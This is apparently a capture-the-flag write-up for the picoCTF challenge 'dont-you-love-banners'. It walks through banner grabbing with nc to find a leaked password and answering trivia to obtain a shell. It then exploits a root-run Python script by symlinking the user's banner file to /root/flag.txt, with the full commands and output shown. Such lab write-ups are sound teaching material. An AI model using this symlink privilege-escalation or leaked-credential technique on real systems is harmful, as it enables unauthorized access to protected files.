# dont-you-love-banners (300 points)
Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 63715`. Use the leaked information to get to the server.

To connect to the running application use `nc tethys.picoctf.net 49894`. From the above information abuse the machine and find the flag in the /root directory.

## Solution
We got the information, that the server is leaking some information on port 63715 and that the topic is any kind of banners. So let's try banner grabbing on that port:
```
$ nc -v tethys.picoctf.net 63715
tethys.picoctf.net [3.140.72.182] 63715 open
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.
$ nc -v tethys.picoctf.net 49894
```
Exactly, we got a password here. Let's head over to application:
```
$ nc -v tethys.picoctf.net 49894
tethys.picoctf.net [3.140.72.182] 49894 open
*************************************
**************WELCOME****************
*************************************

what is the password?

```
We are asked for a password. If we enter our finding we get another question:
```
what is the password?
My_Passw@rd_@1234

What is the top cyber security conference in the world?

```
This should be simple. The _DEC CON_ is probably the best known conference under cyber security specialists:
```
What is the top cyber security conference in the world?
DEF CON

the first hacker ever was known for phreaking(making free phone calls), who was it?

```

And we got the next question. First I thought that could be Kevin Mitnick, but he wasn't. So I just searched for it and found the following information in this [source](https://www.coloradosupport.com/when-did-the-first-hack-happen/):

_Nicknamed Captain Crunch, and often referred to as the first-ever hacker. That individual, mentioned in Curtis Hyde’s ‘Interruption of the Day’ video, goes down in history as an official phone phreak and whistle-blower.

_[...]_

_John Draper, a computer programmer, and former phone phreak, are historically known in the computer programming world and the hacker and security communities as Captain Crunch, Crunch, or Crunchman._

So I tried _John Draper_:
```
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

player@challenge:~$
```

Correct! We got a shell.

Let's investigate this a bit. In our home directory is the banner that we already saw by the initial connection:
```
player@challenge:~$ ls -al
ls -al
total 20
drwxr-xr-x 1 player player   20 Mar  9 16:39 .
drwxr-xr-x 1 root   root     20 Mar  9 16:39 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7 17:25 banner
-rw-r--r-- 1 root   root     13 Feb  7 17:25 text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ 
```
The other files are also not interesting. We know that the flag is in the root directory, so let's try if we can access this:
```
player@challenge:~$ ls -al /root
ls -al /root
total 16
drwxr-xr-x 1 root root    6 Mar 12 00:18 .
drwxr-xr-x 1 root root   41 Mar 15 21:39 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12 00:18 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
player@challenge:~$ 
```
We can!

The flag isn't readable, but there is a python script:
```
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$
```

This script is the application, that creates the questions. In the first few lines the file `/home/player/banner` is read to display the banner. 

Probably is the script called with root permissions. So if we replace the real banner with another file we could access it without direct permissions. To do so we can create a symlink pointing to the `flag.txt`:
```
player@challenge:~$ mv banner banner_bak
mv banner banner_bak
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls -al
ls -al
total 20
drwxr-xr-x 1 player player   38 Mar 15 21:57 .
drwxr-xr-x 1 root   root     20 Mar  9 16:39 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Mar 15 21:57 banner -> /root/flag.txt
-rw-r--r-- 1 player player  114 Feb  7 17:25 banner_bak
-rw-r--r-- 1 root   root     13 Feb  7 17:25 text
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$
```

We still can't access the flag, but if we connect again with the application the script will try to open the symlink with root permissions and print it out:
```
$ nc tethys.picoctf.net 63931
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}

what is the password?

```

Perfect, we got our flag.
